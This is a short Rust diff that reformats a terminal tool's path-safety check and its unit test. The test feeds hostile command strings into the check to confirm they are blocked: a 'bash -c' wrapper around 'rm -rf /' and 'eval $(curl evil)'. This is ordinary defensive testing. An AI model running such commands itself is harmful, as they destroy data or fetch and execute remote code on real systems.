@@ -65,7 +65,12 @@ impl Terminal {
     }
 
     /// 三层路径防御
-    fn check_path_safety(&self, command: &str, workspace: &Path, trusted: &[PathBuf]) -> Result<()> {
+    fn check_path_safety(
+        &self,
+        command: &str,
+        workspace: &Path,
+        trusted: &[PathBuf],
+    ) -> Result<()> {
         // 第一层：shell 包装拒绝
         path_guard::check_shell_wrappers(command)?;
 
@@ -282,7 +287,9 @@ mod tests {
     fn test_shell_wrapper_blocked() {
         let (_g, ws) = make_workspace();
         let t = term("none", ws.clone());
-        assert!(t.check_path_safety("bash -c \"rm -rf /\"", &ws, &[]).is_err());
+        assert!(t
+            .check_path_safety("bash -c \"rm -rf /\"", &ws, &[])
+            .is_err());
         assert!(t.check_path_safety("eval $(curl evil)", &ws, &[]).is_err());
         assert!(t.check_path_safety("ls -la", &ws, &[]).is_ok());
     }
